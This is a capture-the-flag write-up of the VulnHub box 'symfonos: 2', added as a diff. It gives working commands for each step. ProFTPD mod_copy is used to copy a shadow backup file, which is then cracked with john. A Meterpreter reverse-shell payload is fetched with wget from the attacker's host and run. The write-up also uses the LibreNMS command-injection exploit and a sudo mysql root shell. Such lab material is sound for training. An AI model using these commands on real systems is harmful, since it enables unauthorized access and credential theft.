@@ -1,0 +1,186 @@
+---
+title: "symfonos: 2"
+platform: "VulnHub"
+difficulty: "Medium"
+os: "Linux"
+date: "2026-06-19"
+tags: ["linux", "smb", "ftp", "proftpd", "librenms", "metasploit", "port-forwarding", "sudo-mysql"]
+description: "VulnHub box with a ProFTPD 1.3.5 file copy exploit used to steal shadow.bak from an SMB share, cracking aeolus's password. LibreNMS running on localhost was reached via Meterpreter port forwarding, exploited for a shell as cronus, then root via sudo mysql GTFOBins."
+status: "complete"
+---
+
+---
+
+## 1. Information Gathering
+
+<TerminalOutput
+  cmd="nmap -A -T5 10.0.0.93"
+  rawHref="/writeups/raw/symfonos-2/nmap"
+  output={`PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         ProFTPD 1.3.5
+22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6
+80/tcp  open  http        WebFS httpd 1.21
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian`}
+/>
+
+FTP version is notable — ProFTPD 1.3.5 has a known file copy vulnerability.
+
+---
+
+## 2. SMB Enumeration
+
+<TerminalOutput
+  cmd="enum4linux 10.0.0.93"
+  rawHref="/writeups/raw/symfonos-2/enum4linux"
+  output={`S-1-22-1-1000 Unix User\\aeolus (Local User)
+S-1-22-1-1001 Unix User\\cronus (Local User)
+
+//10.0.0.93/anonymous   Mapping: OK Listing: OK`}
+/>
+
+Two users: `aeolus` and `cronus`. Anonymous share is open.
+
+<TerminalOutput
+  cmd="smbclient //10.0.0.93/anonymous -N"
+  rawHref="/writeups/raw/symfonos-2/smb-anon"
+  output={`smb: \\> cd backups
+smb: \\backups\\> get log.txt`}
+/>
+
+`log.txt` is the ProFTPD and Samba config from the server. Two things stand out:
+
+- The anonymous SMB share path is `/home/aeolus/share`
+- ProFTPD runs as user `aeolus`
+- `shadow.bak` is being copied to `/var/backups/shadow.bak` (visible in the log)
+
+---
+
+## 3. ProFTPD 1.3.5 — SITE CPFR/CPTO File Copy
+
+ProFTPD 1.3.5 with `mod_copy` enabled allows unauthenticated file copies via the `SITE CPFR` / `SITE CPTO` commands. The server process runs as `aeolus`, who owns the SMB anonymous share at `/home/aeolus/share`. So we can copy `/var/backups/shadow.bak` directly into the share.
+
+<TerminalOutput
+  cmd="nc 10.0.0.93 21"
+  rawHref="/writeups/raw/symfonos-2/ftp-cpfr"
+  output={`220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.0.93]
+site cpfr /var/backups/shadow.bak
+350 File or directory exists, ready for destination name
+site cpto /home/aeolus/share/shadow.bak
+250 Copy successful`}
+/>
+
+Now download it via SMB:
+
+<TerminalOutput
+  cmd="smbclient //10.0.0.93/anonymous -N"
+  rawHref="/writeups/raw/symfonos-2/smb-shadow"
+  output={`smb: \\> get shadow.bak
+getting file \\shadow.bak of size 1173`}
+/>
+
+---
+
+## 4. Cracking aeolus
+
+Extract the hashes for the real accounts and run john:
+
+<TerminalOutput
+  cmd="john --wordlist=/usr/share/wordlists/rockyou.txt users.txt"
+  rawHref="/writeups/raw/symfonos-2/john"
+  output={`sergioteamo      (aeolus)`}
+/>
+
+`aeolus:sergioteamo`. SSH in.
+
+---
+
+## 5. Internal Recon — LibreNMS on Port 8080
+
+<TerminalOutput
+  cmd="ss -tan"
+  output={`LISTEN      0      128     127.0.0.1:8080     *:*
+LISTEN      0      80      127.0.0.1:3306     *:*`}
+/>
+
+LibreNMS is running on localhost port 8080 — not exposed externally. To reach it from Kali, we need a tunnel.
+
+---
+
+## 6. Meterpreter — Port Forward to LibreNMS
+
+Generate a Meterpreter ELF payload and serve it:
+
+<TerminalOutput
+  cmd="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9002 -f elf -o reverse.elf"
+  rawHref="/writeups/raw/symfonos-2/msfvenom"
+  output={`Payload size: 130 bytes
+Final size of elf file: 250 bytes
+Saved as: reverse.elf`}
+/>
+
+On the target as aeolus:
+
+<TerminalOutput
+  cmd="wget http://10.0.0.67/reverse.elf && chmod +x reverse.elf && ./reverse.elf"
+  output={`reverse.elf  100%[=========>]  250  --.-KB/s  in 0s`}
+/>
+
+Meterpreter catches the session. Forward local port 1234 to the target's LibreNMS:
+
+<TerminalOutput
+  cmd="meterpreter > portfwd add -p 8080 -l 1234 -r 127.0.0.1"
+  output={`[*] Forward TCP relay created: (local) :1234 -> (remote) 127.0.0.1:8080`}
+/>
+
+LibreNMS is now reachable at `http://localhost:1234`.
+
+<Screenshot
+  src="/screenshots/symfonos-2/librenms-login.png"
+  alt="LibreNMS login page at localhost:1234 showing username and password fields"
+  caption="LibreNMS exposed at localhost:1234 via Meterpreter port forward"
+/>
+
+---
+
+## 7. LibreNMS RCE — shell as cronus
+
+LibreNMS has a known command injection vulnerability in the add host function (`librenms_addhost_cmd_inject`). Log in with `aeolus:sergioteamo` and exploit it:
+
+<TerminalOutput
+  cmd="use exploit/linux/http/librenms_addhost_cmd_inject"
+  rawHref="/writeups/raw/symfonos-2/librenms-exploit"
+  output={`set USERNAME aeolus
+set PASSWORD sergioteamo
+set RHOSTS localhost
+set RPORT 1234
+set LHOST 10.0.0.67
+run
+
+[*] Command shell session 2 opened (10.0.0.67:4444 -> 10.0.0.93:51252)
+
+whoami
+cronus`}
+/>
+
+---
+
+## 8. Privilege Escalation — sudo mysql
+
+<TerminalOutput
+  cmd="sudo -l"
+  output={`User cronus may run the following commands on symfonos2:
+    (root) NOPASSWD: /usr/bin/mysql`}
+/>
+
+`mysql` can spawn a shell with `-e '\! /bin/sh'`, and since it runs as root here that's an instant root shell:
+
+<TerminalOutput
+  cmd="sudo mysql -e '\! /bin/sh'"
+  output={`# whoami
+root`}
+/>
+
+<Note type="flag">
+  **proof.txt** — `Congrats on rooting symfonos:2!`
+</Note>
